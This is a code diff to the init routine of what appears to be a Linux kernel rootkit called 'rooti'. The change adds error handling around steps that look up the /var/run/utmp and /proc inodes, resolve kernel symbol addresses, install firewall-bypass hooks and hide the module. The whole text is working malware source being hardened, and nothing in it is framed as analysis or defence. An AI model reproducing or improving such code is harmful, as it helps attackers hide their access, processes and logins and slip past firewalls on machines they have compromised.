@@ -278,10 +278,18 @@ static int __init rooti_init(void)
 
     ROOTI_DEBUG("init");
 
-    kern_path("/var/run/utmp", LOOKUP_FOLLOW, &path);
+    err = kern_path("/var/run/utmp", LOOKUP_FOLLOW, &path);
+    if (err) {
+        ROOTI_DEBUG("kern_path() failed: %d", err);
+        return err;
+    }
     utmp_inode = path.dentry->d_inode;
 
-    kern_path("/proc", LOOKUP_FOLLOW, &path);
+    err = kern_path("/proc", LOOKUP_FOLLOW, &path);
+    if (err) {
+        ROOTI_DEBUG("kern_path() failed: %d", err);
+        return err;
+    }
     proc_inode = path.dentry->d_inode;
 
     err = rooti_resolve_kln_addr();
@@ -296,7 +304,11 @@ static int __init rooti_init(void)
         return err;
     }
 
-    rooti_install_fw_bypass_hooks();
+    err = rooti_install_fw_bypass_hooks();
+    if (err) {
+        ROOTI_DEBUG("rooti_install_fw_bypass_hooks() failed: %d", err);
+        return err;
+    }
 
 #ifndef ROOTI_DEBUG_SHOWME
     err = rooti_hideme();
